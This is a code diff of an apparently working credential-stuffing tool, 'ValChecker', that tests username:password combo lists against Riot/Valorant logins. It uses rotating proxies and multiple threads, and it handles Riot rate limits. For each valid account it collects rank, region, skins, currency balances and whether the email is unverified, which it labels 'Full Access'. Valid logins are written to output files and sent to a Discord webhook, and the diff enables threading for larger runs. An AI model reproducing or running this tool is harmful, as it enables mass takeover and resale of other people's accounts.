@@ -18,8 +18,7 @@ stff = staff.staff()
 
 
 class simplechecker():
-    def __init__(self, settings: list, proxylist, useragent) -> None:
-        self.useragent = useragent
+    def __init__(self, settings: list, proxylist) -> None:
         path = os.getcwd()
         self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
         self.proxylist = proxylist
@@ -105,11 +104,9 @@ class simplechecker():
             self.whtext = f'{Fore.LIGHTGREEN_EX}Using the webhook{Fore.RESET}'
         self.count = count
         os.system(f'mode con: cols=150 lines=32')
-        # self.threadam = int(input(
-        #    f'input number if threads (min 1 max 1000) (proxies: {self.proxycount} (don\'t work rn)) >>>'))
-        input(f'0 threads (you can\'t edit this now); {self.proxycount} proxies; enter to start >>>')
-        #self.threadam = self.threadam if 1000 > self.threadam > 0 else self.proxycount if self.proxycount > 1 else 3
-        self.threadam = 0
+        self.threadam = int(input(
+            f'input number if threads (min 1 max 1000) (proxies: {self.proxycount}) >>>'))
+        self.threadam = self.threadam if 1000 > self.threadam > 0 else self.proxycount if self.proxycount > 1 else 3
         menu_choices = [
             Separator(),
             'GUI',
@@ -122,8 +119,7 @@ class simplechecker():
         self.whtime = sys.getmillis()
         if self.uselog == False:
             self.printinfo()
-        # if self.threadam == 1:
-        if True:
+        if self.threadam <= 1:
             for account in accounts:
                 if ':' not in account:
                     self.checked += 1
@@ -131,39 +127,39 @@ class simplechecker():
                 us = account.split(':')[0]
                 ps = account.split(':')[1]
                 self.checker(us, ps)
-            return
-        while True:
-            if threading.active_count() <= self.threadam:
-                if len(accounts) > num:
-                    try:
-                        us = accounts[num].split(':')[0]
-                        ps = accounts[num].split(':')[1]
+        else:
+            while True:
+                if threading.active_count() <= self.threadam:
+                    if len(accounts) > num:
+                        try:
+                            us = accounts[num].split(':')[0]
+                            ps = accounts[num].split(':')[1]
 
-                        threading.Thread(target=self.checker,
-                                         args=(us, ps)).start()
-                        # self.printinfo()
-                        num += 1
-                    except:
-                        print("Checked all")
+                            threading.Thread(target=self.checker,
+                                             args=(us, ps)).start()
+                            # self.printinfo()
+                            num += 1
+                        except:
+                            print("Checked all")
 
     def checker(self, username, password):
         riotlimitinarow = 0
         proxy = sys.getproxy(self.proxylist)
-        account = f'{username}:{password}'
+        acc = f'{username}:{password}'
         space = " "
-        authenticate = auth.auth(self.useragent)
+        authenticate = auth.auth()
         while True:
             try:
-                token, entt, uuid, unverifmail, banuntil = authenticate.auth(
-                    account, proxy=proxy)
-                if banuntil != None:
-                    banuntil = stff.checkban(banuntil)
-                if token == 2:
+                account = authenticate.auth(
+                    acc, proxy=proxy)
+                if account.banuntil != None:
+                    stff.checkban(account)
+                if account.code == 2:
                     with open(f'{self.parentpath}/log.txt', 'a') as f:
                         f.write(
-                            f'({datetime.now()}) {unverifmail}\n_________________________________\n')
+                            f'({datetime.now()}) {account.errmsg}\n_________________________________\n')
                     self.err += 1
-                elif token == 1:
+                elif account.code == 1:
                     if riotlimitinarow < self.max_rlimits:
                         if riotlimitinarow == 0:
                             self.inrlimit += 1
@@ -184,60 +180,56 @@ class simplechecker():
                         with open(f'{self.parentpath}/output/riot_limits.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'\n{account}')
                         break
-                elif token == 6:
-                    if unverifmail == True:
-                        proxy = sys.getproxy(self.proxylist)
+                elif account.code == 6:
+                    proxy = sys.getproxy(self.proxylist)
                     self.retries += 1
                     time.sleep(1)
                     continue
-                elif token == 3:
+                elif account.code == 3:
                     self.printinfo()
                     self.checked += 1
                     break
-                elif token == 0:
+                elif account.code == 0:
                     self.printinfo()
                     self.checked += 1
                     break
-                elif token == 4:
+                elif account.code == 4:
                     self.banned += 1
-                elif token == 5:
+                elif account.code == 5:
                     self.retries += 1
                     time.sleep(1)
                     continue
                 else:
-                    if unverifmail == True and banuntil == None:
+                    if account.unverifiedmail and account.banuntil is None:
                         self.unverifiedmail += 1
                     while True:
-                        #reg, lvl = sys.get_region(token,entt,uuid,reg)
-                        reg2, country, lvl = sys.get_region2(token,entt,uuid,proxy)
-                        reg = reg2
-                        if reg != 'N/A' and reg != '':
-                            if banuntil == None:
-                                self.regions[str(reg).lower()] += 1
-                            rank = None
+                        sys.get_region2(account, proxy)
+                        if account.region != 'N/A' and account.region != '':
+                            if account.banuntil is None:
+                                self.regions[account.region.lower()] += 1
+                            account.rank = None
                             try:
-                                if int(lvl) < 20 and banuntil == None:
+                                if int(account.lvl) < 20 and account.banuntil is None:
                                     self.locked += 1
-                                    rank = 'locked'
+                                    account.rank = 'locked'
                             except ValueError:
                                 pass
-                            if rank == None:
-                                rank = check.ranked(
-                                    entt, token, uuid, reg).lower().split(' ')[0]
-                            if banuntil == None:
+                            if account.rank is None:
+                                check.ranked(account)
+                            if account.banuntil is None:
                                 try:
-                                    self.ranks[rank] += 1
+                                    self.ranks[account.rank] += 1
                                 except:
                                     self.ranks['unknown'] += 1
-                            skins = check.skins_en(entt, token, uuid, reg)
+                            check.skins_en(account)
                             # get inv price
                             invprice = 0
-                            for skin in skins.split('\n'):
+                            for skin in account.skins.split('\n'):
                                 invprice += check.skinprice(skin)
-                            vp, rp = check.balance(entt, token, uuid, reg)
-                            skinscount = len(skins.split('\n'))
+                            check.balance(account)
+                            skinscount = len(account.skins.split('\n'))
                             skinscount -= 1
-                            if skinscount > 0 and banuntil == None:
+                            if skinscount > 0 and account.banuntil == None:
                                 self.skins += 1
                                 if skinscount > 70:
                                     self.skinsam['70+'] += 1
@@ -251,27 +243,36 @@ class simplechecker():
                                     self.skinsam['10-20'] += 1
                                 else:
                                     self.skinsam['1-10'] += 1
-                            lastplayed = check.lastplayed(
-                                uuid, reg, token, entt)
+                            check.lastplayed(account)
                             break
                         else:
-                            vp, rp = 'N/A', 'N/A'
-                            lastplayed = 'N/A'
-                            if banuntil == None:
+                            account.vp, account.rp = 'N/A', 'N/A'
+                            account.lastplayed = 'N/A'
+                            if account.banuntil == None:
                                 self.ranks['unknown'] += 1
                                 self.regions['unknown'] += 1
-                            rank = 'N/A'
+                            account.rank = 'N/A'
                             skinscount = 'N/A'
-                            skins = 'N/A\n'
-                            reg = 'N/A'
+                            account.skins = 'N/A\n'
+                            account.region = 'N/A'
                         break
-                    skinsformatted = '\n'.join(skins.split('\n'))
-                    if banuntil != None:
+                    skinsformatted = '\n'.join(account.skins.split('\n'))
+                    banuntil = account.banuntil
+                    unverifmail = account.unverifiedmail
+                    lvl = account.lvl
+                    reg = account.region
+                    country = account.country
+                    rank = account.rank
+                    lastplayed = account.lastplayed
+                    vp = account.vp
+                    rp = account.rp
+
+                    if account.banuntil != None:
                         self.tempbanned += 1
                         with open(f'{self.outpath}/tempbanned.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║ Ban Until: {banuntil}{space*(61-len(f'Ban Until: {banuntil}'))}║
 ║                                                             ║
 ║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
@@ -294,7 +295,7 @@ class simplechecker():
                         with open(f'{self.outpath}/valid.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║                                                             ║
 ║                                                             ║
 ║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
@@ -319,7 +320,7 @@ class simplechecker():
                         with open(f'{self.outpath}/regions/{reg}/{rank}.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║ {bantext}{space*(60-len(bantext))}║
 ║                                                             ║
 ║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
@@ -350,7 +351,7 @@ class simplechecker():
                         with open(f'{path}/{reg}.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
-║            | {account} |{space*(49-len(f'| {account} |'))}║
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║                                                             ║
 ║                                                             ║
 ║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
@@ -366,7 +367,7 @@ class simplechecker():
                         if reg == 'N/A' and not self.send_ukreg:
                             send_wh = False
 
-                        if skinscount == 1 and 'Wayfinder Shorty' in skins and not self.send_wfshorty:
+                        if skinscount == 1 and 'Wayfinder Shorty' in account.skins and not self.send_wfshorty:
                             send_wh = False
 
                         if banuntil != None and not self.send_tempban:
@@ -389,7 +390,7 @@ class simplechecker():
                             embed.set_author(name='ValChecker')
                             embed.set_timestamp()
                             embed.add_embed_field(
-                                name='LogPass', value=account)
+                                name='LogPass', value=account.logpass)
                             embed.add_embed_field(
                                 name='Region', value=f'{reg} ({country})')
                             embed.add_embed_field(name='Rank', value=rank)
@@ -400,8 +401,8 @@ class simplechecker():
                                 name='Full Access', value=unverifmail)
                             embed.add_embed_field(
                                 name=f'VP / RP', value=f'{vp} / {rp}')
-                            embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP', value=skins if skins.replace(
-                                ' ', '').replace('\n', '') != '' else 'drugged capybaras')
+                            embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP', value=account.skins if account.skins.strip(
+                            ) != '' else 'drugged capybaras')
                             dcwebhook.add_embed(embed)
                             response = dcwebhook.execute()
                             # input(response)
@@ -439,7 +440,6 @@ class simplechecker():
             else:
                 self.esttime = 'N/A'
 
-
         if self.webhook != '' and self.send_stats and finishedtesting-self.whtime > 300000:
             from discord_webhook import DiscordEmbed, DiscordWebhook
             dcwebhook = DiscordWebhook(url=self.webhook)
@@ -461,7 +461,6 @@ class simplechecker():
             dcwebhook.add_embed(embed)
             response = dcwebhook.execute()
             self.whtime = sys.getmillis()
-
 
         reset = Fore.RESET
         cyan = Fore.CYAN
